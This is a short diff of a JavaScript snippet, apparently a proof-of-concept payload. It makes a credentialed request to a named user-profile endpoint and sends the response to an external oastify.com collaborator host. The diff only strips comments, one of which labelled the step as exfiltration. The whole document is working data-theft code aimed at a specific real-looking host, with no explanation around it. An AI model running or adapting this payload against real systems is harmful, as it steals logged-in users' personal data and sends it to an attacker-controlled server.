@@ -2,10 +2,9 @@
 (async () => {
   const r = await fetch('https://uapami.huuhong.com.vn:6805/uap/userSelf', {
     method: 'GET',
-    credentials: 'include' // như withCredentials=true
+    credentials: 'include'
   });
   const text = await r.text();
-  // Exfiltrate (mã hóa đề phòng ký tự đặc biệt)
   const q = encodeURIComponent(text);
   await fetch('https://hn8pguuu23fwjz09t6ftzt36mxsogfc31.oastify.com/log?d=' + q);
 })();
